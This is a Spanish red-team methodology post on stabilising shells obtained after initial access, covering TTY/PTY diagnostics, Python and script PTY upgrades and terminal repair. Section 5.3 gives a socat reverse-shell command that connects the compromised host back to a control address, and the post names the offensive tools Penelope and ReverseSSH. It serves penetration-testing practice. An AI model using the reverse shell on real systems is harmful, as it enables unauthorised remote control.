---
title: "Metodología de tratamiento y estabilización de shells"
date: 2026-09-14
draft: false
tags: ["red-team", "post-explotacion", "shell", "tty", "pty", "linux", "windows", "metodologia"]
categories: ["metodologias"]
summary: "Metodología para clasificar, estabilizar, operar, recuperar y documentar shells en Linux y Windows: TTY/PTTY, gestión de terminal, transporte, transferencia de ficheros, OPSEC operativa y trazabilidad."
---

## Introducción

Una shell obtenida tras una fase de acceso inicial no equivale necesariamente a una sesión operativa. Puede tratarse de un canal de entrada/salida básico, sin TTY, sin control de señales, sin variables de entorno coherentes, sin capacidad para ejecutar programas interactivos o con un transporte inestable.

Por ello, el tratamiento de la shell debe considerarse una fase propia entre el acceso inicial y cualquier actividad posterior: **estabilizar la sesión, caracterizar sus capacidades, mejorar la interactividad, reducir los fallos operativos y documentar el estado real del acceso**.

El objetivo no es únicamente “tener una terminal”, sino responder de forma fiable a preguntas como:

- ¿Qué usuario ejecuta realmente los comandos?
- ¿Qué sistema operativo y arquitectura hay detrás?
- ¿La sesión tiene TTY, PTY, consola o canal no interactivo?
- ¿Funciona `stdin`, `stdout` y `stderr` de forma separada?
- ¿Se pueden usar señales como `Ctrl+C`, `Ctrl+Z` o `Ctrl+D` sin perder la sesión?
- ¿Los binarios interactivos funcionan correctamente?
- ¿El canal permite transferencia de datos, pivotado controlado o reconexión?
- ¿Qué información debe conservarse como evidencia de la sesión?

En Linux y sistemas Unix-like, la diferencia esencial suele estar entre una shell básica y una shell asociada a una pseudo-terminal (**PTY**). En Windows, la distinción práctica se sitúa entre sesiones CMD, PowerShell, WinRM, SSH y consolas con soporte ConPTY.

## Alcance

Esta metodología cubre:

- Clasificación de shells y canales de acceso.
- Validación inicial de contexto, identidad y privilegios.
- Estabilización de shells Linux sin TTY.
- Gestión de TTY, PTY, terminal local, señales y dimensiones.
- Alternativas a Python para crear una PTY.
- Uso de `socat`, SSH y otros transportes para sesiones interactivas fiables.
- Tratamiento de shells Windows mediante CMD, PowerShell, WinRM, SSH y ConPTY.
- Transferencia operativa de ficheros y verificación criptográfica.
- Gestión de errores, recuperación ante bloqueos y restauración de terminal.
- OPSEC operativa y minimización de impacto.
- Registro de evidencias, comandos y resultados.
- Matriz de decisión para elegir el método adecuado.

---

### Convenciones de ejecución

Para evitar errores operativos, todos los comandos de esta metodología se etiquetan según el sistema en el que deben ejecutarse:

| Etiqueta | Significado |
|---|---|
| `[LOCAL]` | Equipo desde el que se controla la sesión |
| `[REMOTO]` | Sistema donde ya existe la shell |
| `[WINDOWS]` | Sistema remoto Windows |
| `[LINUX]` | Sistema remoto Linux o Unix-like |
| `[AMBOS]` | Debe ejecutarse o verificarse en ambos extremos |
| `[TECLA]` | Acción física de teclado, no comando que se copia y pega |

Ejemplo:

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Crear una PTY</span>
<span class="tool">python3</span> -c 'import pty; pty.spawn("/bin/bash")'

<span class="comment"># [TECLA][LOCAL] Suspender el cliente que mantiene la sesión</span>
CTRL+Z

<span class="comment"># [LOCAL] Configurar el terminal local y devolver el trabajo al primer plano</span>
<span class="tool">stty</span> raw -echo; <span class="tool">fg</span></code></pre>

Los comandos que cambian atributos del terminal, como `stty raw -echo`, se ejecutan en el terminal local que mantiene el canal, no dentro de la shell remota.

---

## 1. Modelo de madurez de una shell

No todas las sesiones ofrecen las mismas capacidades. Antes de ejecutar herramientas complejas conviene clasificar la shell en uno de los siguientes niveles.

| Nivel | Tipo de sesión | Capacidades | Limitaciones habituales |
|---|---|---|---|
| 0 | Canal de ejecución ciega | Ejecuta un comando y devuelve una respuesta mínima o ninguna | Sin interacción, sin estado, sin TTY |
| 1 | Shell básica | Permite ejecutar comandos secuenciales | Flechas, tabulador, `sudo`, `su`, `vim` o `nano` pueden fallar |
| 2 | Shell con entrada/salida | Tiene `stdin`, `stdout` y, a veces, `stderr` | No necesariamente tiene terminal ni control de señales |
| 3 | PTY funcional | Soporta interacción, señales, programas TUI y control de terminal | Puede tener tamaño incorrecto o entorno incompleto |
| 4 | Sesión interactiva robusta | PTY/TTY, transporte fiable, entorno coherente, reconexión viable | Requiere mayor preparación y control operacional |
| 5 | Sesión administrable | Canal autenticado y auditable, por ejemplo SSH o WinRM | Depende de credenciales, configuración y alcance |

Una shell “funcional” para tareas no interactivas no siempre es suficiente para procedimientos que requieren una terminal real. Utilidades como `sudo`, `su`, `ssh`, `passwd`, `top`, `less`, `man`, `vim`, `nano`, `tmux` o `screen` pueden depender de un terminal asociado.

La señal más clara de que una sesión está incompleta es que las teclas de control se comportan de forma anómala:

- `Ctrl+C` cierra el canal completo en vez de interrumpir el proceso remoto.
- `Ctrl+Z` no suspende el proceso actual.
- Las flechas imprimen secuencias como `^[[A`.
- El tabulador no completa rutas o comandos.
- `stty`, `tty`, `su`, `sudo`, `ssh` o editores interactivos fallan.
- La salida aparece desordenada o no se ve lo que se escribe.
- Los programas TUI muestran errores como `TERM environment variable not set`.

---

## 2. Validación inicial de la sesión

La estabilización no debe empezar modificando el entorno a ciegas. Primero hay que capturar el estado de la sesión tal como se obtuvo.

### 2.1. Triage inicial de capacidades

Antes de cambiar la shell, conviene comprobar de forma rápida qué tipo de intérprete existe, qué descriptores están conectados y qué utilidades pueden ayudar a estabilizar la sesión. Esta fase debe ser de solo lectura siempre que sea posible.

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Identificar la shell, intérprete y flags activos</span>
<span class="tool">echo</span> "shell=$0"
<span class="tool">echo</span> "flags=$-"
<span class="tool">ps</span> -p $$ -o pid=,ppid=,sid=,pgid=,tty=,stat=,args=
<span class="tool">readlink</span> /proc/$$/exe 2&gt;/dev/null
<span class="tool">cat</span> /proc/$$/comm 2&gt;/dev/null

<span class="comment"># [REMOTO][LINUX] Verificar entrada, salida y error estándar</span>
<span class="tool">test</span> -t 0 &amp;&amp; <span class="tool">echo</span> "stdin=tty" || <span class="tool">echo</span> "stdin=no-tty"
<span class="tool">test</span> -t 1 &amp;&amp; <span class="tool">echo</span> "stdout=tty" || <span class="tool">echo</span> "stdout=no-tty"
<span class="tool">test</span> -t 2 &amp;&amp; <span class="tool">echo</span> "stderr=tty" || <span class="tool">echo</span> "stderr=no-tty"

<span class="comment"># [REMOTO][LINUX] Probar si stdout y stderr llegan separados al operador</span>
<span class="tool">printf</span> 'stdout-test\n'
<span class="tool">printf</span> 'stderr-test\n' &gt;&amp;2

<span class="comment"># [REMOTO][LINUX] Verificar rutas binarias frecuentes</span>
<span class="tool">for</span> bin in bash sh dash zsh busybox python3 python script socat expect perl ruby ssh tmux screen; do
    <span class="tool">command</span> -v "$bin" 2&gt;/dev/null &amp;&amp; <span class="tool">printf</span> '%-10s %s\n' "$bin" "$(command -v "$bin")"
<span class="tool">done</span>

<span class="comment"># [REMOTO][LINUX] Identificar si el sistema es un contenedor o entorno mínimo</span>
<span class="tool">cat</span> /proc/1/cgroup 2&gt;/dev/null
<span class="tool">test</span> -f /.dockerenv &amp;&amp; <span class="tool">echo</span> "docker-marker-present"
<span class="tool">ls</span> -la /bin /usr/bin 2&gt;/dev/null | <span class="tool">head</span></code></pre>

La presencia de `i` en la variable `$-` indica que la shell se considera interactiva. Sin embargo, una shell interactiva no garantiza por sí sola que exista una TTY utilizable, por lo que debe contrastarse con `tty`, `test -t` y `stty -a`.

| Señal observada | Interpretación operativa |
|---|---|
| `$-` contiene `i` | La shell se ejecuta en modo interactivo |
| `test -t 0` devuelve éxito | La entrada estándar está conectada a una terminal |
| `test -t 1` devuelve éxito | La salida estándar está conectada a una terminal |
| `test -t 2` devuelve éxito | La salida de error está conectada a una terminal |
| `tty` devuelve `/dev/pts/N` | Hay una TTY o PTY asignada |
| `tty` devuelve `not a tty` | La sesión no tiene terminal de control |
| `ps` muestra `TTY=?` | El proceso no tiene terminal asociada |
| `/proc/1/cgroup` muestra un runtime de contenedores | Puede tratarse de un contenedor o espacio de nombres aislado |

### 2.2. Identidad y privilegios

<pre class="cmd-block"><code><span class="comment"># Identidad efectiva y grupos</span>
<span class="tool">id</span>
<span class="tool">whoami</span>
<span class="tool">groups</span>

<span class="comment"># Usuario, UID, GID y grupos desde una fuente adicional</span>
<span class="tool">getent</span> passwd "$(whoami)"
<span class="tool">getent</span> group

<span class="comment"># Directorio de trabajo y home</span>
<span class="tool">pwd</span>
<span class="tool">echo</span> "$HOME"

<span class="comment"># Procesos y sesión asociada</span>
<span class="tool">ps</span> -ef
<span class="tool">ps</span> -o pid,ppid,user,tty,stat,cmd -p $$</code></pre>

Además de la identidad principal, conviene recoger el contexto de proceso. Un mismo usuario puede ejecutar una shell desde un servicio, una tarea programada, un contenedor, una sesión SSH, una aplicación web o un agente de gestión.

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Contexto de proceso de la shell actual</span>
<span class="tool">ps</span> -p $$ -o pid=,ppid=,user=,uid=,gid=,sid=,pgid=,tty=,stat=,lstart=,args=
<span class="tool">ps</span> -p "$(ps -o ppid= -p $$ | tr -d ' ')" -o pid=,ppid=,user=,tty=,stat=,args=

<span class="comment"># [REMOTO][LINUX] Variables de entorno relevantes, ordenadas</span>
<span class="tool">env</span> | <span class="tool">sort</span>

<span class="comment"># [REMOTO][LINUX] Directorio de la shell y ejecutable real</span>
<span class="tool">pwd</span> -P
<span class="tool">readlink</span> -f /proc/$$/cwd 2&gt;/dev/null
<span class="tool">readlink</span> -f /proc/$$/exe 2&gt;/dev/null

<span class="comment"># [REMOTO][LINUX] Sesión y usuarios conectados, cuando estén disponibles</span>
<span class="tool">who</span> 2&gt;/dev/null
<span class="tool">w</span> 2&gt;/dev/null
<span class="tool">loginctl</span> session-status 2&gt;/dev/null</code></pre>

Si el proceso padre corresponde a un servidor web, gestor de colas, servicio de CI/CD, tarea programada o agente de monitorización, debe registrarse porque condiciona la estabilidad de la shell: el proceso puede reiniciarse, tener un entorno reducido o carecer de terminal por diseño.

Conviene registrar, como mínimo:

- Usuario efectivo y grupos.
- UID y GID.
- Directorio actual.
- Directorio home.
- PID de la shell.
- PID del proceso padre.
- TTY asociada, si existe.
- Fecha y hora del sistema remoto.
- Hostname y dirección IP.
- Sistema operativo y arquitectura.

### 2.3. Identificación de sistema y arquitectura

<pre class="cmd-block"><code><span class="comment"># Información general del sistema</span>
<span class="tool">hostname</span>
<span class="tool">uname</span> -a
<span class="tool">uname</span> -m
<span class="tool">cat</span> /etc/os-release 2&gt;/dev/null

<span class="comment"># Kernel, distribución y arquitectura de procesos</span>
<span class="tool">getconf</span> LONG_BIT
<span class="tool">file</span> /bin/sh 2&gt;/dev/null
<span class="tool">file</span> /bin/bash 2&gt;/dev/null

<span class="comment"># Fecha, zona horaria y uptime</span>
<span class="tool">date</span>
<span class="tool">timedatectl</span> 2&gt;/dev/null
<span class="tool">uptime</span></code></pre>

La arquitectura importa porque condiciona la compatibilidad de binarios, herramientas auxiliares y procedimientos posteriores. Las arquitecturas habituales incluyen `x86_64`, `i686`, `aarch64`, `armv7l`, `ppc64le` y `s390x`.

### 2.4. Determinar si existe TTY o PTY

<pre class="cmd-block"><code><span class="comment"># Debe devolver una ruta tipo /dev/pts/0 si existe terminal</span>
<span class="tool">tty</span>

<span class="comment"># Inspección de descriptores de fichero de la shell actual</span>
<span class="tool">ls</span> -l /proc/$$/fd 2&gt;/dev/null

<span class="comment"># Información de sesión, terminal y procesos</span>
<span class="tool">ps</span> -o pid,ppid,sid,pgid,tty,stat,cmd -p $$

<span class="comment"># Estado de terminal: fallará si no hay TTY</span>
<span class="tool">stty</span> -a</code></pre>

Resultados orientativos:

| Comando | Resultado | Interpretación |
|---|---|---|
| `tty` | `/dev/pts/0` | Hay terminal o pseudo-terminal asociada |
| `tty` | `not a tty` | La sesión no tiene TTY |
| `stty -a` | Muestra configuración | Existe dispositivo terminal controlable |
| `stty -a` | `Inappropriate ioctl for device` | No hay TTY disponible para ese proceso |
| `ps ... tty` | `pts/0`, `tty1` | Sesión con terminal asociada |
| `ps ... tty` | `?` | Proceso sin terminal de control |

---

## 3. Anatomía de una terminal Unix

En Unix, un terminal no es solo una ventana. Hay varios componentes con funciones distintas:

| Componente | Función |
|---|---|
| Shell | Intérprete de comandos: Bash, Zsh, Dash, Sh |
| TTY | Terminal físico o lógico asociado a un proceso |
| PTY | Pseudo-terminal formada por un extremo maestro y otro esclavo |
| `stdin` | Descriptor 0: entrada estándar |
| `stdout` | Descriptor 1: salida estándar |
| `stderr` | Descriptor 2: salida de errores |
| Session ID | Agrupa procesos de una misma sesión |
| Process Group | Agrupa procesos que reciben señales de terminal |
| Controlling terminal | Terminal que entrega señales y controla el primer plano |
| Terminal line discipline | Capa del kernel que procesa caracteres, eco y señales |

Una PTY permite que procesos remotos se comporten como si estuvieran conectados a una terminal real. Por ello, una PTY suele resolver problemas con:

- Control de señales.
- Eco de teclado.
- Edición de línea.
- Autocompletado.
- Programas de pantalla completa.
- Solicitudes de contraseña.
- Cambios de modo de terminal.
- Redimensionado de consola.

El control de trabajos de Bash depende de una interfaz interactiva conectada a un terminal y de la cooperación entre el kernel, el controlador de terminal y la shell. `Ctrl+Z` normalmente suspende el proceso en primer plano, mientras que `bg` y `fg` permiten reanudarlo en segundo plano o primer plano respectivamente. [1][3]

---

## 4. Estabilización de shells Linux

### 4.1. Objetivo de la estabilización

Una secuencia de estabilización busca conseguir:

1. Una PTY remota.
2. Un terminal local en modo adecuado para transportar caracteres sin alterarlos.
3. Una shell remota situada de nuevo en primer plano.
4. Variables de entorno razonables.
5. Dimensiones de terminal correctas.
6. Comprobación de señales, edición de línea y programas interactivos.

La secuencia clásica no es un truco aislado: corrige una incompatibilidad entre un canal básico de entrada/salida y los requisitos de los programas interactivos.

### 4.2. Diagnóstico antes de elegir un método

Antes de intentar una PTY conviene identificar el motivo concreto por el que la sesión es limitada. No todas las limitaciones se resuelven con `pty.spawn()`.

| Síntoma | Causa probable | Acción de diagnóstico |
|---|---|---|
| `tty` devuelve `not a tty` | No existe terminal asociada | Comprobar Python, `script`, `socat` u otro método de PTY |
| `stty -a` falla | No hay terminal controlable | Crear PTY antes de usar herramientas TUI |
| `sudo` indica que necesita TTY | Política de terminal o shell limitada | Validar PTY y revisar el mensaje exacto |
| Las flechas imprimen `^[[A` | `TERM` incorrecta o entrada sin línea disciplinada | Revisar `TERM`, PTY y atributos `stty` |
| `Ctrl+C` corta todo el canal | La señal la gestiona el cliente local | Usar PTY o transporte que propague `SIGINT` |
| No hay autocompletado | Shell no interactiva, Readline ausente o `$TERM` incorrecto | Comprobar `$-`, `$0`, `SHELL` y `TERM` |
| `reset` o `clear` fallan | Base terminfo ausente o `TERM` inválida | Probar `TERM=xterm`, `TERM=vt100` o `TERM=dumb` |
| `vim`, `less` o `top` dibujan mal | Filas y columnas desincronizadas | Comparar `stty size` local y remoto |
| La sesión se cierra al acabar un proceso | La shell depende de un proceso padre efímero | Revisar PPID, árbol de procesos y servicio padre |
| No existe `/proc` | Appliance, BusyBox, BSD, macOS o entorno restringido | Usar `ps`, `tty`, `stty`, `uname` y herramientas portables |

La regla operativa es sencilla: no se debe aplicar una receta única. Se debe identificar primero qué componente falta: PTY, control de señales, terminal local, variables de entorno, dimensiones, binario disponible o estabilidad del transporte.

### 4.3. Método principal: Python y módulo `pty`

Si Python está disponible en el sistema remoto, suele ser la opción más sencilla para crear una pseudo-terminal.

<pre class="cmd-block"><code><span class="comment"># Python 3: crear una PTY con Bash</span>
<span class="tool">python3</span> -c 'import pty; pty.spawn("/bin/bash")'

<span class="comment"># Python 3: usar la shell POSIX básica si Bash no existe</span>
<span class="tool">python3</span> -c 'import pty; pty.spawn("/bin/sh")'

<span class="comment"># Python 2, si existe en sistemas antiguos</span>
<span class="tool">python</span> -c 'import pty; pty.spawn("/bin/bash")'</code></pre>

Tras crear la PTY, es normal que todavía falte reconfigurar el terminal local y restaurar la shell al primer plano.

### 4.4. Secuencia completa de PTY y modo raw

La secuencia debe ejecutarse por fases y distinguiendo con precisión el terminal local de la sesión remota.

#### Fase A: crear una PTY en el sistema remoto

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Prioridad 1: Python 3 con Bash</span>
<span class="tool">python3</span> -c 'import pty; pty.spawn("/bin/bash")'

<span class="comment"># [REMOTO][LINUX] Si Bash no existe</span>
<span class="tool">python3</span> -c 'import pty; pty.spawn("/bin/sh")'

<span class="comment"># [REMOTO][LINUX] Sistemas antiguos con Python 2</span>
<span class="tool">python</span> -c 'import pty; pty.spawn("/bin/bash")'</code></pre>

#### Fase B: suspender el proceso local que mantiene el canal

<pre class="cmd-block"><code><span class="comment"># [TECLA][LOCAL] No escribir literalmente el texto; pulsar la combinación</span>
CTRL+Z</code></pre>

Esta acción devuelve el control al terminal local y suspende el cliente que mantiene la sesión. No debe ejecutarse dentro de la shell remota.

#### Fase C: guardar y modificar atributos del terminal local

Antes de cambiar el estado del terminal local, guardar su configuración para facilitar la recuperación.

<pre class="cmd-block"><code><span class="comment"># [LOCAL] Guardar atributos locales para restauración manual</span>
<span class="tool">stty</span> -g &gt; /tmp/stty-shell-backup.$$

<span class="comment"># [LOCAL] Activar modo raw y desactivar eco; devolver el trabajo al primer plano</span>
<span class="tool">stty</span> raw -echo; <span class="tool">fg</span></code></pre>

Si el terminal queda sin eco, escribir `stty sane` y pulsar Enter aunque el texto no se vea.

#### Fase D: completar el entorno remoto

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Declarar shell y tipo de terminal</span>
<span class="tool">export</span> SHELL=/bin/bash
<span class="tool">export</span> TERM=xterm-256color

<span class="comment"># [REMOTO][LINUX] Restaurar PATH para entornos de servicio o mínimos</span>
<span class="tool">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

<span class="comment"># [REMOTO][LINUX] Locale consistente para parsing y resultados reproducibles</span>
<span class="tool">export</span> LANG=C
<span class="tool">export</span> LC_ALL=C

<span class="comment"># [REMOTO][LINUX] Prompt visible y corto</span>
<span class="tool">export</span> PS1='[\u@\h \W]\$ '</code></pre>

`xterm-256color` es apropiado cuando la definición terminfo existe en el sistema remoto. Si aplicaciones de terminal fallan por falta de terminfo, usar temporalmente un valor más conservador.

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Alternativas compatibles con sistemas mínimos</span>
<span class="tool">export</span> TERM=xterm
<span class="tool">export</span> TERM=vt100
<span class="tool">export</span> TERM=dumb</code></pre>

`TERM=dumb` reduce prestaciones, pero puede ser útil para evitar secuencias de control corruptas en appliances, sistemas mínimos o sesiones sin base terminfo.

#### Fase E: sincronizar dimensiones

<pre class="cmd-block"><code><span class="comment"># [LOCAL] Obtener filas y columnas reales</span>
<span class="tool">stty</span> size

<span class="comment"># [REMOTO][LINUX] Sustituir FILAS y COLUMNAS por el resultado local</span>
<span class="tool">stty</span> rows &lt;FILAS&gt; columns &lt;COLUMNAS&gt;
<span class="tool">export</span> LINES=&lt;FILAS&gt;
<span class="tool">export</span> COLUMNS=&lt;COLUMNAS&gt;</code></pre>

#### Fase F: validar resultado

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Debe devolver /dev/pts/N</span>
<span class="tool">tty</span>

<span class="comment"># [REMOTO][LINUX] Debe mostrar atributos de terminal</span>
<span class="tool">stty</span> -a

<span class="comment"># [REMOTO][LINUX] Debe incluir "i" si Bash se considera interactiva</span>
<span class="tool">echo</span> "$-"

<span class="comment"># [REMOTO][LINUX] Debe mostrar el tipo de terminal configurado</span>
<span class="tool">printf</span> 'TERM=%s\n' "$TERM"

<span class="comment"># [REMOTO][LINUX] Confirmar grupo de procesos y terminal</span>
<span class="tool">ps</span> -o pid=,ppid=,sid=,pgid=,tpgid=,tty=,stat=,cmd= -p $$</code></pre>

### 4.5. Restauración de terminal si algo falla

El error operativo más frecuente es dejar el terminal local en modo `raw` y sin eco. En ese estado, parece que el teclado ha dejado de funcionar, pero normalmente los caracteres siguen llegando.

Para restaurarlo:

<pre class="cmd-block"><code><span class="comment"># Escribir aunque no se vea y pulsar Enter</span>
<span class="tool">stty</span> sane</code></pre>

Alternativas útiles:

<pre class="cmd-block"><code><span class="comment"># Restaurar configuraciones de terminal de forma más completa</span>
<span class="tool">reset</span>

<span class="comment"># Restaurar echo y modo canónico manualmente</span>
<span class="tool">stty</span> echo sane

<span class="comment"># Consultar configuración actual</span>
<span class="tool">stty</span> -a</code></pre>

Antes de utilizar `stty raw -echo`, conviene abrir otra terminal local preparada para recuperación. Es una medida sencilla que evita perder tiempo ante un fallo de sesión.

### 4.6. Ajuste de filas y columnas

El tamaño de terminal remoto debe coincidir con el del terminal local para que programas como `vim`, `less`, `nano`, `top`, `htop` o `tmux` no dibujen incorrectamente.

**En el terminal local:**

<pre class="cmd-block"><code><span class="tool">stty</span> size</code></pre>

Si el resultado es, por ejemplo:

<pre class="cmd-block"><code>42 160</code></pre>

**En la sesión remota:**

<pre class="cmd-block"><code><span class="tool">stty</span> rows 42 columns 160</code></pre>

También es posible definirlo mediante variables de entorno en algunos escenarios:

<pre class="cmd-block"><code><span class="tool">export</span> LINES=42
<span class="tool">export</span> COLUMNS=160</code></pre>

La herramienta `stty` permite consultar y modificar los parámetros del terminal. Si no existe una TTY asociada, el ajuste no tendrá efecto o devolverá un error de dispositivo no apropiado.

### 4.7. Comprobación de funcionalidad

Tras estabilizar, validar antes de continuar:

<pre class="cmd-block"><code><span class="comment"># Debe devolver /dev/pts/N</span>
<span class="tool">tty</span>

<span class="comment"># Debe mostrar atributos de terminal</span>
<span class="tool">stty</span> -a

<span class="comment"># Debe identificar Bash como shell actual</span>
<span class="tool">echo</span> "$SHELL"
<span class="tool">echo</span> "$0"

<span class="comment"># Debe tener una variable de terminal válida</span>
<span class="tool">echo</span> "$TERM"

<span class="comment"># Validación de programas que requieren terminal</span>
<span class="tool">sudo</span> -l
<span class="tool">su</span> -
<span class="tool">ssh</span> -V
<span class="tool">less</span> /etc/passwd</code></pre>

No es necesario ejecutar todos los comandos. La idea es comprobar gradualmente que la sesión soporta:

- Entrada y salida.
- Señales.
- Modo de pantalla.
- Solicitudes de contraseña.
- Control de trabajos.
- Redimensionado.

---

## 5. Alternativas para crear una PTY

Python no siempre está instalado. La metodología debe incluir rutas alternativas ordenadas por disponibilidad y calidad del resultado.

| Método | Requisito | Calidad de interacción | Portabilidad | Comentario |
|---|---|---:|---:|---|
| `python3` + `pty.spawn()` | Python 3 | Alta | Alta | Primera opción habitual |
| `python` + `pty.spawn()` | Python 2 | Alta | Media | Útil en sistemas heredados |
| `script` | util-linux o BSD `script` | Alta | Alta | Alternativa limpia y frecuente |
| `socat` con PTY | Socat en los extremos necesarios | Muy alta | Media | PTY, sesión y señales más completas |
| `expect` | Tcl/Expect | Media-alta | Media | Útil para automatización interactiva |
| `perl` | Perl y módulos disponibles | Variable | Media | Depende de módulos y build |
| `ruby` | Ruby instalado | Variable | Baja-media | Situacional |
| `busybox` | BusyBox con applets incluidos | Baja-media | Alta en appliances | Útil para inventario; PTY no garantizada |
| SSH con `-tt` | SSH y credenciales | Muy alta | Alta | Transporte autenticado y administrable |
| `tmux` / `screen` | PTY ya funcional | Alta | Media | Mejora persistencia de la sesión, no crea PTY desde cero |
| WinRM / PowerShell Remoting | Windows configurado | Alta | Alta en Windows | Administración remota con objetos |
| Penelope | Python 3.6+ en el atacante | Muy alta | Alta (Unix); parcial (Windows) | Automatiza detección de interpretador, upgrade a PTY, resize y logging |
| ReverseSSH | Binario estático desplegado en el objetivo | Muy alta | Alta (Linux y Windows) | Servidor SSH completo con SFTP y port forwarding, sin PTY manual |

### 5.1. `script`

`script` puede iniciar una shell dentro de una pseudo-terminal. En sistemas Linux modernos suele formar parte de `util-linux`.

<pre class="cmd-block"><code><span class="comment"># Crear PTY sin guardar transcripción</span>
<span class="tool">script</span> /dev/null -qc /bin/bash

<span class="comment"># Variante equivalente con orden alternativo de argumentos</span>
<span class="tool">script</span> -q /dev/null -c /bin/bash

<span class="comment"># Usar shell POSIX si no existe Bash</span>
<span class="tool">script</span> /dev/null -qc /bin/sh</code></pre>

El uso de `/dev/null` evita generar un fichero de transcripción local asociado a `script`. La técnica aparece como alternativa práctica a Python para crear una PTY. [5]

### 5.2. Compatibilidad de `script`

La sintaxis de `script` varía entre implementaciones GNU/util-linux y BSD/macOS. Antes de automatizar una invocación conviene consultar la ayuda local.

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX/BSD] Identificar implementación y sintaxis disponible</span>
<span class="tool">script</span> --version 2&gt;/dev/null
<span class="tool">script</span> --help 2&gt;/dev/null
<span class="tool">man</span> script 2&gt;/dev/null | <span class="tool">head</span> -n 40</code></pre>

En Linux con util-linux suelen funcionar patrones como:

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Crear una shell bajo PTY sin guardar transcripción útil</span>
<span class="tool">script</span> -q /dev/null -c /bin/bash

<span class="comment"># [REMOTO][LINUX] Alternativa con shell POSIX</span>
<span class="tool">script</span> -q /dev/null -c /bin/sh</code></pre>

No se debe asumir que todos los sistemas aceptan exactamente el mismo orden de parámetros. En macOS y algunos BSD, la semántica de `-c` y el manejo del fichero de salida pueden diferir.

### 5.3. `socat`

`Socat` permite enlazar flujos y puede crear una PTY completa, asociando además una nueva sesión y un manejo de señales más coherente. Es especialmente útil cuando está disponible en ambos extremos.

**Terminal de control:**

<pre class="cmd-block"><code><span class="tool">socat</span> file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>

**Sistema remoto:**

<pre class="cmd-block"><code><span class="tool">socat</span> exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;IP_CONTROL&gt;:4444</code></pre>

Desglose de opciones:

| Opción | Función |
|---|---|
| `exec:'bash -li'` | Ejecuta una Bash interactiva de login |
| `pty` | Asocia el proceso a una pseudo-terminal |
| `stderr` | Une la salida de error al canal |
| `setsid` | Crea una sesión nueva |
| `sigint` | Propaga correctamente interrupciones |
| `sane` | Aplica atributos de terminal razonables |
| `raw,echo=0` | Configura el extremo local para transmitir caracteres sin procesamiento ni eco |

La documentación práctica de Full TTYs recoge este patrón como una forma de obtener una shell con PTY, sesión, señales y configuración de terminal más completas que una canalización estándar. [5]

### 5.4. Entornos BusyBox, appliances y contenedores mínimos

En appliances de red, contenedores mínimos y sistemas embebidos puede no existir Python, Bash, `script`, `socat` ni siquiera `/proc`. El objetivo inicial debe ser inventariar lo disponible, no asumir un entorno Linux completo.

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Identificar BusyBox y applets disponibles</span>
<span class="tool">busybox</span> 2&gt;/dev/null
<span class="tool">busybox</span> --list 2&gt;/dev/null | <span class="tool">sort</span>

<span class="comment"># [REMOTO][LINUX] Localizar shells y binarios frecuentes</span>
<span class="tool">ls</span> -l /bin/sh /bin/ash /bin/bash /bin/dash /bin/zsh 2&gt;/dev/null
<span class="tool">find</span> /bin /sbin /usr/bin /usr/sbin -maxdepth 1 -type f 2&gt;/dev/null | <span class="tool">sort</span>

<span class="comment"># [REMOTO][LINUX] Comprobaciones portables sin depender de /proc</span>
<span class="tool">tty</span>
<span class="tool">stty</span> -a
<span class="tool">ps</span>
<span class="tool">uname</span> -a
<span class="tool">mount</span>
<span class="tool">id</span></code></pre>

En estos entornos, una PTY completa puede no ser posible con los binarios ya presentes. Si las tareas son no interactivas, es preferible usar comandos simples, salida estructurada, redirecciones explícitas y evitar herramientas TUI.

### 5.5. Alternativas de baja frecuencia: Perl, Ruby y `expect`

Perl, Ruby y `expect` pueden crear una PTY, pero su disponibilidad es baja en instalaciones base: `IO::Pty` en Perl y la gema `pty` en Ruby no se incluyen por defecto en la mayoría de distribuciones, y `expect` solo suele estar presente cuando hay automatizaciones heredadas de administración. En la práctica quedan por detrás de Python, `script`, `socat` y SSH, y deben tratarse como opciones de último recurso, no como receta por defecto.

<pre class="cmd-block"><code><span class="comment"># [REMOTO][LINUX] Comprobar runtimes y módulos de PTY antes de usarlos</span>
<span class="tool">perl</span> -v 2&gt;/dev/null
<span class="tool">perl</span> -MIO::Pty -e 'print "IO::Pty disponible\n"' 2&gt;/dev/null
<span class="tool">ruby</span> -v 2&gt;/dev/null
<span class="tool">ruby</span> -e 'require "pty"; puts "PTY disponible"' 2&gt;/dev/null
<span class="tool">command</span> -v expect 2&gt;/dev/null

<span class="comment"># [REMOTO][LINUX] Si expect está disponible</span>
<span class="tool">expect</span> -c 'spawn /bin/bash; interact'</code></pre>

Si Python, `script`, SSH o un canal administrativo ya están disponibles, deben preferirse por ser más mantenibles y fáciles de documentar. No conviene desplegar Perl, Ruby o `expect` como dependencias nuevas sin una necesidad operacional clara.

### 5.6. Comprobación de binarios disponibles

En lugar de probar herramientas al azar, comprobar de forma ordenada:

<pre class="cmd-block"><code><span class="tool">command</span> -v python3
<span class="tool">command</span> -v python
<span class="tool">command</span> -v script
<span class="tool">command</span> -v socat
<span class="tool">command</span> -v expect
<span class="tool">command</span> -v perl
<span class="tool">command</span> -v ruby
<span class="tool">command</span> -v ssh
<span class="tool">command</span> -v busybox</code></pre>

Una metodología profesional prioriza herramientas ya presentes y evita introducir binarios nuevos si no hay una necesidad operacional clara.

### 5.7. Herramientas de automatización: Penelope y ReverseSSH

Las fases 4.3 a 4.7 automatizan una secuencia manual que, en operaciones reales, puede resolverse con herramientas dedicadas. Estas herramientas no sustituyen el conocimiento del proceso manual — que sigue siendo necesario cuando no se pueden introducir binarios nuevos — pero reducen errores operativos y aportan funciones adicionales (logging, multi-sesión, transferencia de ficheros integrada).

#### Penelope

